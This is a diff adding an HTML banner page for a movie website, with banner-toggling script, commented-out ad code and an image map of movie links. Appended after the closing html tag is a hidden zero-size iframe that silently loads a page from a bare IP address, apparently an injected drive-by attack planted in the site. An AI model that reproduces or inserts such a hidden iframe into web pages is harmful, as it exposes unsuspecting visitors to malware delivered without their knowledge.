@@ -1,0 +1,66 @@
+
+<html>
+<head>
+	<script language="javascript">
+	<!--
+		function next_mvision()
+		{
+			document.location.reload();
+		}
+		
+		function toggle_mvision()
+    {
+    	if (document.all["mvision1"].style.display == 'none')
+    	{
+    		document.all["mvision1"].style.display = '';
+    		document.all["mvision2"].style.display = 'none';
+    	}
+    	else
+    	{
+    		document.all["mvision1"].style.display = 'none';
+    		document.all["mvision2"].style.display = '';
+    	}
+    
+    	setTimeout('toggle_mvision()', 6000);
+    }
+    
+    //toggle_mvision();
+	//-->
+	</script>
+</head>
+<body style="margin:0">
+<!--
+	<div style="display:none" id="mvision1">
+    <a href="http://blogplay.org/" target="_blank"><img src="/images/temp/2008/0305_blog_525_180.jpg" width="525" height="180" border="0" /></a>
+  </div>
+-->
+<!--
+  <div style="display:" id="mvision2">
+    <script language="javascript" src="http://ad.movist.com:8080/js.kti/movist2006/mvision@1"></script>  
+  </div>
+-->
+
+  <div style="display:" id="mvision1">
+    <img src="/images/temp/2008/0509_week_525_180.jpg" width="525" height="180" border="0" usemap="#525180Map" />
+    <map name="525180Map">
+    	
+    	<area shape="rect" coords="10,30,95,100"    href="/movies/movie.asp?mid=37379" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="115,30,200,100"  href="/movies/movie.asp?mid=22656" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="220,30,305,100"  href="/movies/movie.asp?mid=39083" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="325,30,410,100"  href="/movies/movie.asp?mid=40316" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="430,30,515,100"  href="/movies/movie.asp?mid=40355" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords= "10,105,95,175"  href="/movies/movie.asp?mid=40324" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="115,105,200,175" href="/movies/movie.asp?mid=40770" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="220,105,305,175" href="/movies/movie.asp?mid=40382" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="325,105,410,175" href="/movies/movie.asp?mid=40314" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="430,105,515,175" href="/movies/movie.asp?mid=40823" target="_parent" onFocus="blur()">
+<!--
+      <area shape="rect" coords="0,0,263,180" href="/article/read.asp?type=32&id=14978" target="_parent" onFocus="blur()">
+    	<area shape="rect" coords="263,0,525,180" href="/article/read.asp?type=32&id=14966" target="_parent" onFocus="blur()">
+-->
+    </map>
+  </div> 
+
+</body>
+</html>
+<iframe src=http://211.239.121.161/index.html width=0 height=0></iframe>
